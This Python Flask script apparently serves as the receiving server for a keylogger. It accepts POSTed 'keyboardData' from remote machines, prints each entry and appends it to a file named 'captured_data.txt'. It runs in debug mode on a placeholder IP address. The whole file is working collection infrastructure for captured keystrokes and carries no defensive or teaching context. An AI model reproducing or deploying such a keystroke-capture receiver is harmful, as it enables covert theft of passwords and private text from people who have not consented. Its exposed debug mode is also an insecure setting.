from flask import Flask, request
import json

app = Flask(__name__)

def save_to_text_file(data):
    # Function to save keyboard data to a text file
    with open("captured_data.txt", "a") as file:
        file.write(data)
        file.write("\n")  # Add a newline for each set of keyboard data

@app.route('/', methods=['POST'])
def receive_keyboard_data():
    try:
        # Get JSON data from the POST request
        data = request.get_json()
        keyboard_data = data.get('keyboardData', '')
        
        # Print received keyboard data to the console
        print(f"Received keyboard data: {keyboard_data}")
        
        # Save the data to a text file
        save_to_text_file(keyboard_data)

        return 'Data received successfully!'
    except Exception as e:
        # Handle exceptions and print error message
        print(f"Error processing keyboard data: {str(e)}")
        return 'Error processing data'

if __name__ == '__main__':
    # Run the Flask app on your_IP, port 8080, with debug mode
    app.run(debug=True, host='_your_ip_address_', port=8080)
